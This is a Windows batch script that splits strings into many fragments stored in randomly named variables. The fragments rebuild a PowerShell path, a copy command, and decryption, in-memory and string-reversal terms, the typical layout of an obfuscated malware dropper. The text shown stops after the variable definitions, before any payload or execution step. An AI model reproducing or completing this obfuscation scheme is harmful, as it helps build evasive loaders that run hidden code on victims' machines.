@echo off
set "TvllGLFzGV=Po"
set "YQnWthGCIR=po"
set "PkIgPLvWpm=ll"
set "iPTfcenMqY=0\"
set "lyUIrMvOmd=nd"
set "jgwdadfRgs=co"
set "wAeMSxKWGf=em"
set "vwuWQPVlqh=we"
set "DwcLMvhCbi=32"
set "TseOTNEpLv=\W"
set "GnllUNRror=\v"
set "AeaqtsCnns=he"
set "iQjGAvMrXl=1."
set "nAUCzVyieH=we"
set "HGjynGNqji=st"
set "vxRWGzISDs=y "
set "cxKIRWuFNi= C"
set "ykpboevpTe=ws"
set "nHYYsbqIAy= /"
set "gQoKWpEhmn=Wi"
set "EcwdDPkqTh=py"
set "OAtSqrveDy=xe"
set "lYOpkQtgiQ=rs"
set "FeSQDYpMBs=ll"
set "RPjraduwCV=:\"
set "vSNDFnNIoY=he"
set "jfDTWoCPpZ=rS"
set "rmsAWsUAao=Sy"
set "uONYbliZLB=s\"
set "ySQDeRiGIy=in"
set "jbwiMabXLC=.e"
set "IzdXBOSecA=ow"
set "IYTVKlEyLR=do"
set "QhIqwPdMAk=cd"
set "BwedmIAhux= %~dp0"
set "fefkRRWWdV=tion"
set "lBtdcywhKf=nage"
set "wzNzjGgfiT=j.Pa"
set "SwsTwxPkox=Lj, "
set "vKkAaYTxFs=le  "
set "FrWENBxmyM=PTtG"
set "QUrYdoEwEw=;$wO"
set "fDrVruoGJL=('Tg"
set "dkIvkdJVgT=oL'["
set "aNaQvxAzsz=eMVs"
set "OllroJmiRY=[Sys"
set "XxnSgfrUSa=comm"
set "OSBPAqRGpJ=mory"
set "YDfvXFhdbl=ptog"
set "IsieewCoVE=$JRM"
set "CsnbxfXntX=-joi"
set "yZMGEBBwkK=Syst"
set "YbxvMggidp=  $I"
set "GSBKOwIBGY=KTSt"
set "rorPOAJExG=;$sb"
set "HnYJXthmUY=orF'"
set "kYoInpPnpl=in $"
set "rCokmdTquW=RMjj"
set "YKirzLIlCo=..-1"
set "liTZznTRwv=$HKT"
set "VpwrOTrtqX=Fina"
set "eSacmNtZRn=..-1"
set "fEOIAQcMyb=gMod"
set "MeiRwwEiyS=ecry"
